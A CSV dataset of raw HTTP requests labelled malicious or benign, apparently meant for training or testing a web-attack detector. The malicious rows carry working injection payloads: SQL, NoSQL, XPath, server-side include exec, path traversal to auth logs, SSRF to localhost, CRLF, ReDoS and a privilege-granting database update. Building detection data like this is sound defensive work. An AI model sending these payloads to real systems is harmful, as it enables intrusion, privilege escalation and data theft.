label,text
malicious,"GET /landing.shtml?intro=Hi%20there<!--#exec cmd=""uptime""--> HTTP/1.1
Host: online-book-shop.net
User-Agent: curl/7.68.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"POST /api/v1/file/load HTTP/1.1
Host: user-storage-manager.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 32
Origin: https://user-storage-manager.net
Connection: keep-alive

{""filePath"": ""/var/log/auth.log""}"
malicious,"POST /search/v1/users HTTP/1.1
Host: login-management-portal.biz
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate
Cookie: sid=abc123xyz789

{""query"":{""$where"":""this.username=='admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"GET /download/manuals/user_guide_v5.pdf HTTP/1.1
Host: example.com:8080
Accept: application/pdf
User-Agent: Mozilla/5.0 (Android 13; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0
Referer: http://example.com:8080/help/docs
Connection: keep-alive"
malicious,"GET /content/view?id=7823 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://referrer.game-dev-forum.org/home
X-User-Role: admin
Cache-Control: no-cache"
malicious,"POST /newsletter/signup HTTP/1.1
Host: alerts.news-updater.tv
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html
Accept-Language: en-US
Content-Length: 56

email=user%40alerts.news-updater.tv%0auid%0apwd"
benign,"GET /api/v4/projects/repos/list?owner=team-alpha HTTP/1.1
Host: dev-collab-platform.io
Accept: application/json
X-Api-Token: 7bc8d7dff2ac4ebd8e26b1b12c79c893
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Sec-Fetch-Site: same-origin
Accept-Language: en-US,en;q=0.8"
malicious,"POST /api/v2/report/generate HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 58
Connection: keep-alive
Cookie: session_token=7b3a1f9d6c4e59a71e2f4ea5c097b372

{""reportUrl"": ""http://2130706433/admin/overview?detail=full""}"
malicious,"GET /products/view/89' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/overview HTTP/1.1
Host: online-retail-store.biz
Connection: close
Accept: text/html,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://online-retail-store.biz/products/list
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: cloudapi.smarttech-solutions.ai
Connection: close
Access-Control-Request-Headers: authorization, content-type
Access-Control-Request-Method: GET
Referer: https://dashboard.smarttech-solutions.ai/app
User-Agent: curl/7.85.0
Accept: */*"
benign,"POST /api/v1/feedback/submit HTTP/1.1
Host: feedback-portal.digital-innovations.us
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Language: en-US
Content-Length: 47

{""UNION ALL"": ""feedback=Application running smoothly""}"
benign,"GET /themes/dark-mode/styles.css HTTP/1.1
Host: design-theme-archive.net
Accept: text/css,*/*;q=0.1
If-Modified-Since: Sun, 28 Apr 2024 14:55:00 GMT
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Mobile Safari/537.36
Connection: close
Accept-Language: en-US,en;q=0.9"
malicious,"GET /catalog/item?search_term=12%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: secure-user-portal.net
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Wget/1.21.1
Cookie: sessionid=0d9f51a4cf1c476ebbfa4dcad190d481; csrf_token=abcde12345"
benign,"GET /events/music-festivals/nyc-2024/tickets HTTP/1.1
Host: urban-vibes-events.com
User-Agent: Mozilla/5.0 (Linux; Android 9; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Referer: https://urban-vibes-events.com/events
Connection: keep-alive"
benign,"GET /api/xml/bookings?from=2024-02-01&to=2024-02-15&limit=10 HTTP/1.1
Host: travel-reservations.net
Accept: application/xml
Authorization: Bearer h57a98df32c609b0fa4c
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Connection: keep-alive
Accept-Encoding: gzip"
benign,"GET /static/css/themes/dark-mode.css HTTP/1.1
Host: web-builder-platform.cloud
User-Agent: curl/7.87.0
Accept: */*
Referer: https://design-hubtool.io/dashboard/projects/12713/themes
Connection: keep-alive"
benign,"GET /images/icons/favicon.ico HTTP/1.1
Host: portal-user-experience.ai
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36
Accept: image/x-icon,image/webp,image/apng,*/*;q=0.8
If-None-Match: W/""d7fae923b8""
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"POST /vote/participate HTTP/1.1
Host: metro-cultural-fest.org
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Accept: text/html,application/xhtml+xml,application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Origin: https://metro-cultural-fest.org
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9

poll_id=102&choice_id=5"
benign,"POST /subscribe/newsletter HTTP/1.1
Host: urbanflavorweekly.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/102.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Cache-Control: no-cache
Accept: */*
DNT: 1
Connection: close

email=jeremy.carter%40flavormail.com"
benign,"GET /api/v2/products/filter?data=category%3Delectronics%26brand%3Dquantum-tech%26features%3Dwireless%2Clong-battery%2Cbluetooth%2Chd-display%26color%3Dblack%26priceRange%3D300-1200 HTTP/1.1
Host: online-electro-market.biz
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.6
Referer: https://online-electro-market.biz/products/category/electronics
Connection: keep-alive"
benign,"PUT /user/uploads/profile-pic/789fgh123 HTTP/1.1
Host: media-secure-uploads.net
Content-Type: application/octet-stream
Content-Length: 396
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.124 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Origin: https://media-secure-uploads.net
Cache-Control: no-cache

iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABTUlEQVR4nJWSu0vDUBCFv9bzHR6hrwBfSH+a2VQjCDEBxLGJDBBpjTIgmBPawMFMr8HUHP50yoEwAhtlJVnQR6FDj58841FwYm8TTQzmHsklA9jtXPbiFP6Dt3tzcprwYpCwWnlOwJu5HQe4TrXDGRMusrTJECZRAseLN0WWVXeOa7DYxzpB7JniqePdqaFLHA9PKggA/fQbeEe/9ErRcBt6IgPu75MMb6sKaiqTQpZZqYBSNGzITMHt/AYyGmjGpIaKxWwHoDM2ecnBEHo+tROFAQ5dlEJEKuHAr9NzZRevXomluNIQ8jafGef0tHoHpHh8ZvNKHEZK0ZsROI8CP7EysN7b+i7Qqr485N6fHgsZmkSGHvTZ3RQYIAAAAASUVORK5CYII="
benign,"GET /data/stock-prices?callback=processData&symbol=AMZN HTTP/1.1
Host: financial-data-stream.ai
Accept: application/javascript, */*;q=0.7
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: http://partner-finance-portal.ai/reports"
benign,"GET /api/v1/logs?level=warning&timestamp_start=2024-06-01T00:00:00Z&timestamp_end=2024-06-03T23:59:59Z HTTP/1.1
Host: sysops-alerts.enterprise-solutions.org
Accept: application/json
User-Agent: curl/7.85.0
Authorization: Basic Z2V0bG9nczo5MDFjZjNlZjFlMGUzZjE5NjRiYjI5ODRiOWViYzY3YzE=
Connection: close"
benign,"POST /accounts/settings/update HTTP/1.1
Host: secure-identity-hub.io
Content-Type: application/json
Content-Length: 48
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Connection: keep-alive

{""UNION ALL"": ""notification_settings_modified""}"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: portal.mobilebankingapp.org
User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json-patch+json
Content-Length: 90
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.LkJiOENhqKwl13Dj2843
Connection: keep-alive

[
  { ""op"": ""replace"", ""path"": ""/security/2fa_enabled"", ""value"": true },
  { ""op"": ""remove"", ""path"": ""/notifications/sms"" }
]"
benign,"POST /api/v2/stats/upload HTTP/1.1
Host: analytics.daily-trend.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: text/csv
Content-Length: 90
Accept-Encoding: gzip, deflate, br
Cache-Control: no-store
Cookie: session=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkpXVCJ9In0=
Connection: keep-alive

metric,date,value
page_views,2024-06-15,13452
user_signups,2024-06-15,230
retention_rate,2024-06-15,0.85"
malicious,"PUT /user/input/regex HTTP/1.1
Host: cloudsecure.validation-node.zone
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Origin: https://cloudsecure.validation-node.zone
Sec-CH-UA: ""Chromium"";v=""91"", "" Not A;Brand"";v=""99"", ""Google Chrome"";v=""91""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""Android""
Content-Length: 189

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"POST /app/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 68
Cache-Control: no-cache

email=user%00%08%00@example.com&displayname=John+Doe%00%01--&notify=true"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fonline-retail-store.biz%2Fproducts%2Felectronics%2Ftv%2Fdetails HTTP/1.1
Host: api.online-retail-store.biz
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Cache-Control: no-cache"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Length: 94
Origin: https://community.game-dev-forum.org
Cookie: session=wbFs83jqMl20HdF9

theme=dark';%20db.users.update({username:%27admin%27},%20{$set:{isAdmin:true}});%20//&notifications=true"
benign,"HEAD /downloads/mac/version_5.0.0/mac_installer.dmg HTTP/1.1
Host: update-mgr-app.net
User-Agent: aria2/1.36.0
Accept: */*
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /password/reset HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Content-Length: 34
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: https://secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://secure-user-portal.net/login

email=julia.caldwell%40securemail.net"
benign,"GET /products/electronics/tv/details?utm_source=affiliate&utm_medium=web HTTP/1.1
Host: online-retail-store.biz
Accept: text/html
Connection: keep-alive
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.7
Referer: https://tech-reviews-center.info/reviews/latest
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36"
benign,"POST /register HTTP/1.1
Host: account-hub-connect.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Referer: https://account-hub-connect.io/register
Origin: https://account-hub-connect.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Cookie: session_id=5fd3a7a1bfc9837d92c2c839a93ec914; lang=en-US
Connection: keep-alive

username=janelle_m&email=janelle.morrison%40accounthub.io&password=F!r3Fl1es&password_confirm=F!r3Fl1es&terms_accepted=true"
benign,"GET /search?q=wireless+headphones&category=audio HTTP/1.1
Host: shopathon.online:4567
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://shopathon.online/"
benign,"GET /static/js/vendor.bundle.js HTTP/1.1
Host: ui-web-platform.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: application/javascript, */*;q=0.8
Accept-Encoding: gzip, deflate
If-None-Match: W/""d91f3c7b""
Referer: https://ui-web-platform.net/dashboard
Connection: close"
benign,"GET /posts/2023/08/15/tech-insights?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: my-personal-blog-site.info
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/111.0.5563.110 Chrome/111.0.5563.110 Safari/537.36
Connection: keep-alive"
malicious,"GET /xml_api/search_books?author_id=101%27%20or%20string-length(user%2Fpassword%5B1%5D)%20%3E%205%20or%20%27a%27%3D%27a HTTP/1.1
Host: online-book-warehouse.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /forum/topics?query=how%20to%20bake%20bread HTTP/1.1
Host: community-kitchen-talk.net
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.8
Referer: https://community-kitchen-talk.net/
Connection: keep-alive
Cookie: sessionId=2b1f9a87c7214d3b8c756572;"
benign,"POST /api/log HTTP/1.1
Host: health-tracker.cloudfitnesstracker.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: application/json
Content-Length: 310

{""event"": ""workout_session_end"", ""session"": {""userId"": ""usr7654321"", ""startTime"": ""2024-06-10T05:30:00Z"", ""endTime"": ""2024-06-10T06:15:00Z"", ""exercises"": [{""name"": ""cycling"", ""durationMin"": 30}, {""name"": ""stretching"", ""durationMin"": 15}], ""caloriesBurned"": 310}, ""device"": {""model"": ""FitPlus Pro"", ""os"": ""iOS 16.4""}}"
malicious,"POST /profile/image/source HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 62
Referer: https://my-personal-blog-site.info/profile/edit
Connection: close

{""imageUrl"":""http://0x7f.0x0.0x0.0x1:5000/status?img=profile_pic""}"
benign,"GET /resources/js/vendor/jquery.min.js HTTP/1.1
Host: media-stream-providers.co
Connection: keep-alive
Accept: application/javascript,text/javascript,*/*;q=0.1
Accept-Encoding: gzip, deflate
User-Agent: Wget/1.21.2 (darwin14.0)"
benign,"GET /api/v1/blog/posts?category=technology&limit=15 HTTP/1.1
Host: techwaves-community.io
Accept: application/json
X-API-Key: a12f9b8c3470de58f9a0b712c65d4ef9
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: close"
benign,"GET /user/messages/unread?folder=important HTTP/1.1
Host: mail-cloud-services.ai
Accept: application/json, text/plain, */*
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
User-Agent: python-requests/2.28.2
X-Forwarded-For: 203.0.113.195
Connection: close"
benign,"GET /api/v1/library/search?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: digital-library-service.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.8
DNT: 1
Connection: keep-alive
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
benign,"POST /docs/upload HTTP/1.1
Host: tech-news-hub.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFtb4BCf8EXhX1TIa
Content-Length: 638
Connection: keep-alive
Referer: https://tech-news-hub.io/editor
Cookie: session_token=Ax1P9u3qJ7H2n3YkxVZsl

------WebKitFormBoundaryFtb4BCf8EXhX1TIa
Content-Disposition: form-data; name=""document""; filename=""review_article.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"POST /forum/thread/reply HTTP/1.1
Host: tech-enthusiasts-hub.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Content-Type: multipart/form-data; boundary=----FormBoundary42xD3T
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://tech-enthusiasts-hub.net/forums/12345
Connection: keep-alive
Content-Length: 220

------FormBoundary42xD3T
Content-Disposition: form-data; name=""thread_id""

98765
------FormBoundary42xD3T
Content-Disposition: form-data; name=""username""

mona_k
------FormBoundary42xD3T
Content-Disposition: form-data; name=""reply_text""

Thanks for sharing these build tips—they really helped me optimize my setup.
------FormBoundary42xD3T--"
